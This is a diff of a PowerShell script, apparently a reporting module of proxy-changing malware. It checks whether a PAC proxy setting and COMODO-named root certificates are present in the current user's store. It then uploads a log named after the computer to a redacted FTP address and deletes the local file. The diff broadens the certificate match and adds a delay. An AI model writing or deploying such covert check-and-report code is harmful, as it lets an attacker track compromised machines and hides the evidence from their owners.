@@ -10,7 +10,7 @@ Function LogWrite
 }
 Function UploadLog
 {
-  $dest = "ftp://XXXXXXXXXX@XXXXXXXX";
+  $dest = "ftp://XXXXXXXXXX";
   $webclient = New-Object -TypeName System.Net.WebClient;
   $webclient.UploadFile("$dest/$(gc env:computername).log", $Logfile);
   Remove-Item -Path $Logfile;
@@ -32,7 +32,7 @@ function CheckInstall(){
   catch {
     LogWrite("ERROR: Pac not setted");
   }
-  $Certs = @(Get-ChildItem cert:\CurrentUser\ROOT|Where-Object {$_.Subject -like "*COMODO RSA Extended Validation Secure Server CA 2*"}|ForEach-Object {"{0} ({1})" -f ($_.Thumbprint,$_.NotBefore)});
+  $Certs = @(Get-ChildItem cert:\CurrentUser\ROOT|Where-Object {$_.Subject -like "*COMODO RSA Extended Validation Secure Server CA 2*" -or $_.Subject -like "*COMODO Certification Authority*"}|ForEach-Object {"{0} ({1})" -f ($_.Thumbprint,$_.NotBefore)});
   if (-NOT $Certs.count -eq 0){
     LogWrite("Certs installed: '{0}'" -f ($Certs -join "; "));
   }else {
@@ -72,6 +72,7 @@ function CheckInstall(){
 }
 function StartWork(){
   LogWrite "Start Log module";
+  Start-Sleep -s 3;
   CheckInstall;
   UploadLog;
 }
